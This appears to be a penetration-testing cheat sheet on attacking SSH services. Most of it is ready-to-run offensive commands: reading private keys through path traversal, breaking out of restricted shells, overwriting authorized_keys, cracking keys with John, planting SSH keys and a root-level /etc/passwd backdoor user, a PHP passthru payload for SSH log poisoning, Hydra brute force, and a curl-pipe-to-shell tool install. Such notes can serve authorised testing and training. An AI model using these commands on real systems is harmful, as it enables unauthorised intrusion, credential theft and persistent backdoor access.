---
layout: default
title: SSH
parent: TCP
nav_order: 4-2
---
# SSH | 22
## Methodology
- Do you have valid credentials?
- Do you have real system-level users in which to access SSH with?
- ALWAYS check for user password re-use
- Dealing with id_rsa files - ALWAYS chmod 600 id_rsa
- Collect user SSH keys if able to read: "id_rsa" e.g. somefile.php?file=../../../../home/user/.ssh/id_rsa
- If able to write, drop a SSH key into the user or root directory for login (/root/.ssh/id_rsa)
- Are you able to read the SSH logs (SSH Log Poisoning): /var/log/auth.log

<br/>
###  Restrictive Shell
If you have access to the <i>echo</i> command it is possible to use the built-in API to break out:
<br />
```echo os.system("/bin/bash")```
<br />
Break out of <b> RBash </b>:
``` ssh restricted@$IP -p 31678 -t "bash --noprofile"
OR 
ssh user@$IP "/bin/sh"```

<br />

### SSH Access Denied - pty restricted
- If you can read the 'authorized_keys' file, you may see there is a 'no-pty' option
- We may be able to replace this file if we have an SSH key for the target user using <b>scp</b> with a public key. 
Copy the authorised key, remove the 'no-pty' option  and then place it back on the target, overwriting the blocking file

``` scp -i id_rsa authorized_keys dude@192.168.150.150:.ssh/authorized_keys ```

> This uses an id_rsa key we have previously obtained for a user called 'dude' and replaces authorized_keys with our modified file

Note: If you are not allowed to produce output on the target, use the -O flag

``` scp -O  -i id_rsa authorized_keys dude@192.168.150.150:.ssh/authorized_keys ```


<br />
### Check the following locations for private keys:
<ul>
<li>/home/* </li>
<li>/root/.ssh/* </li>
<li>/etc/ssh/ssh_config</li>
<li> /etc/ssh/sshd/ssh_config</li>
<li> ~/.ssh/*</li>
</ul>

<br />
### Identify the host for the private key:
Check the following locations:
<ul>
<li> /etc/hosts </li>
<li> ~/.known_hosts </li>
<li> ~/.bash_history </li>
<li> ~/.ssh/config </li>
</ul>

<br />

### Command Reference
<b> Search for files containing SSH Keys:</b> <br />
```grep -ir "-----BEGIN RSA PRIVATE KEY-----" /home/*``` <br />
```grep -ir "BEGIN DSA PRIVATE KEY" /*``` <br />

<b> SSH with id_rsa </b> <br />
``` ssh -i id_rsa user@$IP ``` <br />

<b> Crack id_rsa with John (SSH2John) </b> <br />
``` ssh2john id_rsa > crackthis
john crackthis --wordlist=/usr/share/wordlists/rockyou.txt```

<b> SSH Keygen & Back Door (post exploitation) </b> <br />
Generate a new SSH key pair with: <br />
```ssh-keygen -b 2048 -t rsa -f ~/.ssh/new-key-name
chmod 600 new-key-name``` <br />
Drop the 'new-key-name.pub' file into the target /home/usr/.ssh directory. <br />
Connect with: ```ssh -i new-key-name user@$IP```
<b> Add a backdoor as a user </b>
- If you have write access either or via a shell script or other method, append a custom user
```
openssl passwd -1
I.R.noob
$1$istMeAqZ$bjVoxT/.whgAs3t3eNcM3/
echo 'backup:$1$istMeAqZ$bjVoxT/.whgAs3t3eNcM3/:0:0:backup:/home/backup:/bin/bash' >> /etc/passwd
su backup
```
<br />

### Tools
- <a href="https://github.com/pwnesia/ssb"> Secure Shell Bruteforcer (SSB) </a> <br />
```curl -sSfL 'https://git.io/kitabisa-ssb' | sh -s -- -b /usr/local/bin ``` <br />
```ssb [-p port] [-w wordlist.txt] [-t timeout]
      [-c concurrent] [-r retries] [-o output] [user@]hostname```

<br />
### Attacks
<b>SSH Log Poisoning</b>
(RCE via SSH Log Poisoning)
Example PHP web server (capable of viewing the logs):
- Enter something like: ```testlogpoisoning/<?php passthru($_GET['cmd']); ?>``` 
- Refresh the accessible log page - find the newest entry (towards the bottom) and you may see the characters 'testlogpoisoning/'
> This verifies command execution after the format '/' providing executive authority over the machine
``` https://example.com/somefile.php?file=../../../../var/log/auth.log&cmd=id ```
> reopen the file, scroll down and find the results of the command printed

<br />
<b> SSH Brute Force</b>
- Hydra
``` hydra -V -L UserList -P PasswordList ssh://$IP ```
- SSB

<br />

#### SSH 'should' be running?
- Is there a HTTP proxy on the server? SSH may be running but not open to the world - instead of on 0.0.0.0, it may be local on 127.0.0.1
- If this is the case, it is possible to forward out the loopback address with <b> proxytunnel </b>
``` proxytunnel -p $IP:3128 -d 127.0.0.1:22 -a 4444 ```
> Spawn a daemon on our attacking machine (accessible on 4444)
``` ssh user@127.0.0.1 -p 4444 ```

<br />

###### [REFERENCES]
<a href="https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#what-is-a-lateral-movement"> SSH Lateral Movement Cheatsheet </a>
